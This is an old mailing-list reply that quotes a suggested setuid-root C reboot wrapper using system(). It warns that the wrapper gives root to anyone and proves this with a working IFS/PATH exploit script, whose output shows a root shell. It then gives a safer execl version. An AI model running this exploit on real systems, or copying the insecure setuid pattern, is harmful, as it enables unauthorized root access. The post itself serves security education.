>>>>> "Tom" == Tom Regan <tomr@pinn.net> writes:

 Tom> Write a short C program  (call it rboot)
 Tom> main()
 Tom> {
 Tom>   setuid(0);
 Tom>   setgid(0);
 Tom>   system("/usr/sbin/reboot");
 Tom>   exit (0);
 Tom> }
 Tom>  Set the owner to root, and chmod 4755.

Just so you all know, on many systems this allows unlimited root access
to be obtained trivially.

For example, try

$ cat >usr <<\@EOF
#!/bin/sh
IFS=' '
unset IFS
PATH=/bin:/usr/bin:/etc
exec /bin/sh -i
@EOF
$ chmod a+x usr
$ PATH=. IFS=/ rboot
# id
uid=0(root) gid=0(root)
# 

Some newer systems avoid this particular hole, but there are lots out
there where it is still wide open.

system() in a setuid program is a notorious source of holes. The
correct version of the program is:

#include <unistd.h>
#include <stdio.h>

int main(void)
{
   setuid(0);
   setgid(0);
   execl("/usr/sbin/reboot","reboot",NULL);
   perror("exec");
   return 1;
}

Assuming /usr/sbin/reboot is an executable and not a shell script, the
above should be reasonably safe.

-- 
